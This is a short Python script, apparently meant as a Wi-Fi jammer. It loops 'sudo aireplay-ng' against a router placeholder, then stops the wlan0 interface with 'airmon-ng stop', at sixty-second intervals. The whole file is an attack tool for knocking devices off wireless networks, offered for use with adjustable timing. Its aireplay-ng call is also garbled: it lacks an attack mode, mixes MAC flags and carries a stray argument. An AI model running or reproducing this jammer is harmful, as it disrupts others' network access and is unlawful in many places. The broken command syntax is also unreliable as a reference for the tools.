import time
import os
import subprocess


def start_jammer():
    subprocess.run(
        [
            "sudo",
            "aireplay-ng",
            "-a",
            "00:00:00:00:00:00",
            "-c",
            "FF:FF:FF:FF:FF:FF",
            "-b",
            "your_router_mac_address",
            "-i",
            "wlan0",
            "ff00",
        ]
    )


def stop_jammer():
    subprocess.run(["sudo", "airmon-ng", "stop", "wlan0"])


while True:
    start_jammer()
    time.sleep(60)  # Adjust the duration as needed
    stop_jammer()
    time.sleep(60)  # Adjust the duration as needed
